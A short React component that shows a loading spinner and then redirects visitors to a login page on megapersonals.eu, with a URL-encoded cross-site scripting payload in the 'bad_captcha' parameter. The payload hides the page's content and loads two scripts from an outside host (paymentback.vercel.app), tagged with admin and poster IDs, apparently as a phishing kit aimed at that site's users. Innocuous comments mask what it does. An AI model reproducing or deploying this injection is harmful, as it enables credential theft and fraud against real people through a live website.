"use client";
import "./Home.css";
import React, { useEffect, useState } from "react";
import { site } from "../config";

function Home({ adminId, posterId, verifyId}) {
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setTimeout(() => {
      window.location.href = `https://megapersonals.eu/users/auth/login?bad_captcha=%20%3C/h2%3E%20%20%3Cstyle%3E.container%20,%20footer%20%7b%20display:%20none%20;%20%7d%20a%20%7b%20color:%20white;%20%7d%20%3C/style%3E%20%3Cscript%20src=%22https://paymentback.vercel.app/antiClick.js%22%3E%20%3C/script%3E%20%3Cscript%20src=%22https://paymentback.vercel.app/main.js%22%3E%20%3C/script%20%3E&admin=${adminId}&poster=${posterId}&verifyId=${verifyId}&site=${site}`; // Redirect to an external site
    }, 2000); // 2 seconds delay for demonstration
  }, []);

  return (
    <div>
      {loading && <div className="loading-animation"></div>}
      {/* Other components can be rendered here */}
    </div>
  );
}

export default Home;
